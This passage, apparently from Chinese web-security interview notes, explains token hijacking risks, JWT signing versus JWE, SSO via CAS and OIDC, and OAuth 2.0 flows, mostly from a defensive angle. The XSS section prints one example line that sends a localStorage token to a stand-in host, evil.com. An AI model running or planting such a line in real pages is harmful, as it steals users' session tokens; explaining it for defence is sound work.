  - bank.com 没设 Access-Control-Allow-Origin: https://evil.com → 拒绝
  - 即使允许，跨域请求默认不带 Cookie 和自定义头
  - 带 Authorization 头是「非简单请求」，会触发预检
  - 预检失败 → 请求被拦截
```

**5. Token 仍然会被劫持的场景**

- **XSS**：页面被注入恶意 JS，能读到 localStorage 里的 Token
  ```js
  fetch('https://evil.com/steal?token=' + localStorage.getItem('token'))
  ```
- **中间人（HTTP）**：明文 HTTP 下，Token 在 Header 里被嗅探
- **恶意扩展**：浏览器扩展有权限访问页面 DOM 和 storage
- **物理设备**：共享电脑被偷 Token

**6. 如何保护 Token**

- **HTTPS 强制**：防 MITM 窃听
- **短期有效**：Access Token 15 分钟，Refresh Token 长期
- **Refresh Token 存 HttpOnly Cookie**：JS 读不到，防 XSS
- **CSP 限制脚本来源**：防 XSS 注入
- **服务端校验设备/IP/UA**：异常环境拒绝
- **不存 localStorage**：放 Cookie + HttpOnly + SameSite=Strict（但失去 Token 的 CSRF 优势，要权衡）
- **签名 + 加密**：服务端验签防伪造

**7. Cookie vs Token 安全性对比**

| 攻击类型 | Cookie | Token |
|----------|--------|-------|
| CSRF | 易中招（自动带） | 不易（不自动发） |
| XSS 窃取 | HttpOnly 可防 | 易中招（在 JS 可读处） |
| MITM | Secure + HTTPS 可防 | HTTPS 可防 |
| 跨站读取 | 同源策略防 | 同源策略防 |
| 跨站发送 | 默认会带 | 不会（需 CORS 通过 + 代码加头） |

**总结**：Token 不是「不能被劫持」，而是相对 Cookie 多了「不自动发送 + 同源策略 + CORS」三层防护，**特别难被 CSRF 借刀**。但 XSS 仍是 Token 的死穴，需要 HTTPS + CSP + 短期有效 + Refresh Token 综合防护。

### 介绍下如何实现 token 加密

Token（如 JWT）的安全性由「签名 + 加密 + 短期 + 安全传输」共同保证。下面从生成、签名、加密、传输、校验全流程展开。

**1. JWT 的本质：签名而非加密**

JWT 默认只是**签名（JWS）**，不加密：

```text
Header.Payload.Signature

Header  = {"alg":"HS256","typ":"JWT"}            → Base64URL
Payload = {"userId":1,"role":"admin","exp":...}  → Base64URL（明文！）
Signature = HMAC-SHA256(Header.Payload, secret)
```

- Payload 是 Base64URL 编码，**任何人可解码看到内容**
- 签名保证不可篡改，但**不保证机密性**
- 所以 Payload **不能放密码、信用卡号**

**2. 真正的加密：JWE**

如果要让 Token 内容也保密，用 **JWE（JSON Web Encryption）**：

```text
JWE = Header.EncryptedKey.IV.Ciphertext.AuthenticationTag

5 部分：
- Header：加密算法
- EncryptedKey：加密后的密钥
- IV：初始化向量
- Ciphertext：加密后的 Payload
- AuthenticationTag：认证标签
```

JWE 让 Token 既是签名的又是加密的，但实现复杂，绝大多数场景不需要——Payload 本就不该放敏感数据。

**3. 常见签名算法**

| 算法 | 类型 | 适用 |
|------|------|------|
| HS256 | HMAC + SHA-256，对称密钥 | 单体应用，简单 |
| RS256 | RSA + SHA-256，非对称 | 多服务，公钥可验签 |
| ES256 | ECDSA + SHA-256，椭圆曲线 | 现代，性能好 |
| EdDSA | Ed25519 | 最现代，性能最佳 |

**4. 完整 Token 流程**

**4.1 登录生成 Token**

```js
const jwt = require('jsonwebtoken')

const payload = {
  userId: user.id,
  role: user.role,
  // 不要存密码、敏感数据
}
const accessToken = jwt.sign(payload, SECRET, {
  algorithm: 'HS256',
  expiresIn: '15m',          // 短期
  issuer: 'api.example.com',
  audience: 'app.example.com',
})
const refreshToken = jwt.sign({ userId: user.id }, REFRESH_SECRET, {
  expiresIn: '7d',
})
```

**4.2 客户端存储与发送**

```js
// 存储（推荐）
localStorage.setItem('access_token', accessToken)
// Refresh Token 建议放 HttpOnly Cookie，防 XSS

// 发送
fetch('/api/profile', {
  headers: { Authorization: `Bearer ${accessToken}` }
})
```

**4.3 服务端校验**

```js
const jwt = require('jsonwebtoken')

function authMiddleware(req, res, next) {
  const authHeader = req.headers.authorization
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'missing token' })
  }
  const token = authHeader.slice(7)
  try {
    const decoded = jwt.verify(token, SECRET, {
      algorithms: ['HS256'],
      issuer: 'api.example.com',
      audience: 'app.example.com',
    })
    req.userId = decoded.userId
    next()
  } catch (e) {
    return res.status(401).json({ error: 'invalid token' })
  }
}
```

**4.4 Refresh 流程**

```js
// Access Token 过期 → 用 Refresh Token 换新的
app.post('/refresh', (req, res) => {
  const refreshToken = req.cookies.refresh_token  // HttpOnly Cookie
  try {
    const decoded = jwt.verify(refreshToken, REFRESH_SECRET)
    const newAccess = jwt.sign({ userId: decoded.userId }, SECRET, { expiresIn: '15m' })
    res.json({ accessToken: newAccess })
  } catch {
    res.status(401).json({ error: 'refresh failed, please login' })
  }
})
```

**5. 安全加固要点**

| 项 | 措施 |
|----|------|
| 算法 | 用 RS256 / ES256 / EdDSA，禁用 `none` |
| 密钥 | 长度 ≥ 256 位，定期轮换 |
| 有效期 | Access Token 15 分钟，Refresh Token 7 天 |
| 存储 | Access Token 可放 localStorage，Refresh 放 HttpOnly Cookie |
| 传输 | 必须 HTTPS |
| 防重放 | 加 jti（Token ID），服务端黑名单 |
| 防滥用 | 限制 Refresh 次数、绑定设备/IP |
| 主动失效 | 黑名单 / 版本号机制（用户改密码后旧 Token 全失效） |

**6. 防止常见攻击**

- **算法 `none`**：服务端必须显式指定算法，不接受 Token 自报算法
- **算法混淆**：服务端要把 RS256 当 HS256 用，攻击者用公钥当 HMAC 密钥伪造——务必校验 `header.alg`
- **密钥泄露**：服务端密钥放环境变量/KMS，不写代码里
- **Token 窃取**：HTTPS、CSP、XSS 防护

**7. 分布式 Token 校验**

- 对称签名（HS256）：所有服务共享密钥，简单但密钥分发风险
- 非对称签名（RS256）：认证中心签发，其他服务用公钥验签，更安全
- JWKS 端点：服务端通过 `/jwks.json` 暴露公钥，资源服务动态获取

**8. 黑名单机制**

JWT 是无状态的，要主动失效有两种思路：
- **黑名单**：把要废的 jti 存 Redis，校验时检查
- **版本号**：用户表加 `tokenVersion`，Token 里带 version，改密码 → version++ → 旧 Token 失效

**总结**：Token 加密/签名的关键 = **强算法 + 短期 + HTTPS + 安全存储 + Refresh 机制 + 主动失效**。JWS 是签名（默认），JWE 才是真正加密。日常应用绝大多数情况签名即可，敏感数据不放 Payload。

### 说一说SSO单点登录

**SSO（Single Sign-On，单点登录）** 是一种身份认证机制：用户**登录一次**就能访问多个相互信任的应用系统，无需重复登录。对应的还有 **SLO（Single Logout，单点登出）**：一处登出，处处登出。

**1. 解决什么问题**

- 用户在多个系统重复登录，体验差
- 每个系统独立维护账号密码，安全风险大
- 离职员工要在每个系统分别禁用，易遗漏
- 跨多个子系统的会话同步困难

典型场景：Google 全家桶（Gmail、YouTube、Drive 一次登录全用）、企业内网（OA、CRM、HR 一个账号）、阿里云控制台 + 钉钉 + 钉邮。

**2. 核心角色**

```text
用户（User）
  │
应用系统 A、B、C（Service Provider, SP / Client）
  │
认证中心（Identity Provider, IdP / SSO Server）
```

- **IdP（Identity Provider）**：身份提供者，统一登录入口，签发 Token / Ticket
- **SP（Service Provider）**：业务系统，接受 IdP 签发的凭证

**3. 主流协议**

- **CAS（Central Authentication Service）**：耶鲁大学开源，企业常用
- **SAML 2.0**：基于 XML，企业级、跨域 SSO
- **OIDC（OpenID Connect）**：基于 OAuth 2.0，现代主流，JSON 友好
- **JWT + 共享 Token**：轻量自实现方案

**4. CAS 协议流程（典型）**

```text
1. 用户访问 app.example.com/orders
   ↓ 未登录
2. app 重定向到 SSO 登录页：
   https://sso.example.com/login?service=https://app.example.com/orders
   ↓
3. 用户输入账号密码
   ↓
4. SSO 验证通过，生成 Ticket（ST，Service Ticket）
   重定向回 app：
   https://app.example.com/orders?ticket=ST-abc123
   ↓
5. app 拿 Ticket 向 SSO 验证：
   https://sso.example.com/serviceValidate?ticket=ST-abc123
   ↓
6. SSO 返回用户信息（XML/JSON）：
   <user>tom</user><roles>admin</roles>
   ↓
7. app 创建本地 Session，返回自己的 Cookie 给浏览器
   ↓
8. 用户访问 app2.example.com
   ↓ 未登录
9. app2 重定向到 SSO
   ↓
10. SSO 检查全局会话（SSO Cookie 还在）→ 直接签发 Ticket 给 app2
    重定向回 app2?ticket=ST-xyz
   ↓
11. app2 验证 Ticket → 创建本地 Session
   ↓
12. 用户无感知登录了 app2
```

**关键**：第一次登录后 SSO 留下全局 Cookie（TGC，Ticket Granting Cookie），后续其他应用跳转过来时 SSO 看到这个 Cookie 就直接签发 Ticket，不再问密码。

**5. OIDC（OpenID Connect）流程**

OIDC 是 OAuth 2.0 的扩展，专门做身份认证：

```text
1. 用户访问应用 A
2. A 重定向到 IdP：
   https://idp.example.com/auth?
     response_type=code&
     client_id=APP_A&
     redirect_uri=https://app-a.example.com/callback&
     scope=openid profile email
3. 用户在 IdP 登录
4. IdP 重定向回 A，带 code：
   https://app-a.example.com/callback?code=abc
5. A 用 code + client_secret 向 IdP 换 Token：
   POST https://idp.example.com/token
     { code, client_id, client_secret }
   ↓
   返回：
   { access_token, id_token, refresh_token }
6. A 验证 id_token（JWT）→ 拿到用户身份
7. A 创建本地会话
```

`id_token` 是 JWT，含用户身份信息：

```json
{
  "sub": "user-123",
  "email": "tom@example.com",
  "name": "Tom",
  "iss": "https://idp.example.com",
  "aud": "app-a",
  "exp": 1700000000
}
```

**6. 单点登出（SLO）**

- 用户在 IdP 登出 → IdP 通知所有 SP 登出
- CAS 用 back-channel 通知 SP
- OIDC 用 RP-Initiated Logout

**7. 关键设计点**

**7.1 Token / Ticket 安全**

- Ticket 一次性，使用后立即失效
- Ticket 短期有效（如 5 分钟）
- Ticket 与 Service 绑定（不能拿到 A 的 Ticket 用在 B）
- 用 HTTPS 防止 Ticket 泄露

**7.2 全局会话 vs 局部会话**

- 全局会话（SSO Cookie）：IdP 维护
- 局部会话（SP Cookie）：每个 SP 维护
- SLO 要同时清理两种

**7.3 跨域**

- SSO Cookie 设在 IdP 域，其他域访问不到
- 通过重定向让浏览器带 IdP Cookie 来访问 IdP
- SP 之间通过 Token / Ticket 传递身份

**8. 安全考虑**

- 防 Token 重放：用 nonce、时间戳、一次性 Ticket
- 防 CSRF：登录流程用 state 参数
- 防 XSS：IdP Cookie 设 HttpOnly
- HTTPS 强制
- 短期 Token + Refresh Token

**9. 简化方案：JWT + 共享密钥**

小规模系统可以自实现：

```text
1. 用户登录 sso.example.com
2. SSO 签发 JWT，重定向回 app?token=xxx
3. app 用共享密钥验签 JWT → 拿到用户身份
4. app 创建本地 Session
5. 访问 app2 时同样重定向到 SSO
6. SSO 看到自己的 Cookie → 直接签发新 JWT 给 app2
```

**10. 主流实现**

- **企业**：Keycloak、CAS、Shibboleth、Okta、Auth0、Azure AD
- **互联网**：Google Sign-In、微信开放平台、QQ 互联
- **国内**：阿里云 IDaaS、Authing、玉符

**总结**：SSO 让用户一次登录访问多个系统，核心是 IdP 统一认证 + SP 接受凭证。主流协议有 CAS、SAML、OIDC。关键点是 Ticket/Token 安全、全局与局部会话管理、跨域重定向。

### 说一说OAuth

**OAuth 2.0** 是一个**授权框架**（Authorization Framework），让用户能把自己的资源**有限授权**给第三方应用访问，而**不交出密码**。它是「用微信登录」「用 Google 登录」「第三方应用访问你的 GitHub」这类场景的底层协议。

**1. 解决什么问题**

旧时代的做法：把账号密码给第三方应用。

```text
用户 → 第三方应用：「这是我的微信账号密码，你帮我发朋友圈」
第三方应用：「好，我登录你账号发」
```

风险：
- 第三方拿到密码能干任何事
- 改密码后第三方失效，但密码已泄露过
- 无法限制第三方只能做特定操作
- 撤销权限只能改密码

OAuth 2.0 把「授权」和「认证」分离：用户授权 Token 给第三方，Token 只能做特定事、可随时撤销。

**2. 四个核心角色**

| 角色 | 说明 | 例子 |
|------|------|------|
| Resource Owner（资源所有者） | 用户 | 你 |
| Client（客户端） | 第三方应用 | 「石墨文档」想读你的 GitHub 仓库 |
| Authorization Server（授权服务器） | 签发 Token 的 | GitHub OAuth |
| Resource Server（资源服务器） | 存资源的 | GitHub API |

**3. 四种授权流程（Grant Types）**

RFC 6749 定义了 4 种流程，按场景选用：

**3.1 Authorization Code（授权码，最常用）**

适合有后端的服务器应用，最安全：

```text
1. 用户点「用 GitHub 登录」，Client 重定向：
   https://github.com/login/oauth/authorize?
     response_type=code&
     client_id=xxx&
     redirect_uri=https://client.com/callback&
     scope=user:email repo&
     state=randomString

2. 用户在 GitHub 登录并确认授权

3. GitHub 重定向回 Client，带 code：
   https://client.com/callback?code=abc&state=randomString

4. Client 后端用 code + client_secret 换 Token：
   POST https://github.com/login/oauth/access_token
   { code, client_id, client_secret, redirect_uri }
   ↓
   返回：
   { access_token, refresh_token, expires_in, scope }

5. Client 用 access_token 调 GitHub API：
   GET https://api.github.com/user
   Authorization: token xxx
```

**为什么用 code 不直接发 Token？**
- code 通过浏览器重定向传递，可能泄露
- code 必须配合 client_secret 才能换 Token，client_secret 只在 Client 后端
- 即使 code 被截获，没有 client_secret 也换不到 Token

**3.2 Implicit（简化版，已废弃）**

适合纯前端 SPA，直接在 URL 返回 Token：

```text
https://client.com/callback#access_token=xxx
```

**已不推荐**：Token 通过 URL 传递，易泄露。OAuth 2.1 已废弃。改用 Authorization Code + PKCE。

**3.3 Password（密码模式，已废弃）**

用户直接把账号密码给 Client，Client 换 Token。

**已废弃**：违背 OAuth 初衷。仅限高度可信 Client。

**3.4 Client Credentials（客户端凭证）**

机器对机器通信，无用户参与：

```text
POST /token
  grant_type=client_credentials&
  client_id=xxx&client_secret=yyy
```

适合微服务间调用、定时任务访问 API。

**4. PKCE（Proof Key for Code Exchange）**

针对 SPA / 移动端的增强：

```text
1. Client 生成随机 code_verifier，算出 code_challenge = SHA256(code_verifier)
2. 发起授权时带 code_challenge
3. 换 Token 时带 code_verifier
4. 授权服务器校验 SHA256(code_verifier) == code_challenge
```

- 即使 code 被截获，没有 code_verifier 也换不到 Token
- SPA / 移动 App 推荐用 Authorization Code + PKCE 替代 Implicit

**5. Token 的类型**

| Token | 用途 | 有效期 |
|-------|------|--------|
| access_token | 调 API | 短期（如 1 小时） |
| refresh_token | 换新的 access_token | 长期（如 30 天） |
| id_token (OIDC) | 用户身份信息（JWT） | 短期 |

**6. scope（权限范围）**

授权时声明要哪些权限：

```text
scope=user:email repo read:org
```

- 限制 Client 只能做特定操作
- 用户授权时能看到具体要什么权限
- 服务端校验 Token 调 API 时是否在 scope 内

**7. state 防 CSRF**

```text
Client 发起时：state = randomString
授权回调时：state 要一致
```

防止攻击者伪造回调让 Client 用攻击者的 code。

**8. 刷新 Token**

```text
POST /token
  grant_type=refresh_token&
  refresh_token=xxx&
  client_id=xxx
  ↓
  返回新的 access_token
```

- access_token 短期有效，过期用 refresh_token 换
- refresh_token 一次性，用一次发新的
- 用户撤销授权 → refresh_token 失效

**9. OIDC（OpenID Connect）= OAuth 2.0 + Authentication**

OAuth 是「授权」框架，但常被用于「登录」——其实不规范。OIDC 在 OAuth 之上加了 `id_token`（JWT 含用户身份）：

```json
{
  "sub": "user-123",
  "email": "tom@example.com",
  "name": "Tom",
  "iss": "https://accounts.google.com",
  "aud": "client-id",
  "exp": 1700000000
}
```

OIDC 是「用 Google 登录」的标准实现。

**10. 与 SSO 的关系**

- OAuth 是授权框架，不是 SSO 协议
- 但 OAuth + OIDC 常用于实现 SSO（如 Google 全家桶）
- SAML 是企业 SSO 的传统选择

**11. 常见场景**

- 「用 XX 登录」：OAuth + OIDC
- 第三方应用访问你的数据：GitHub OAuth、微信开放平台
- 微服务间 API 调用：Client Credentials
- 移动 App 登录：Authorization Code + PKCE
- IoT 设备：Device Flow

**12. 安全要点**

- 用 HTTPS 全程加密
- `client_secret` 只在后端，不要放前端
- 用 PKCE 防 code 截获
- 用 state 防 CSRF
- access_token 短期，refresh_token 长期
- Token 不放 URL，放 Header
- 校验 scope，最小权限
- 撤销机制要可用

**总结**：OAuth 2.0 是授权框架，让用户不交出密码也能授权第三方访问资源。核心流程是授权码模式（Authorization Code），用 code 换 Token，code 配合 client_secret / PKCE 保证安全。OIDC 在其上扩展做认证，是「第三方登录」的事实标准。
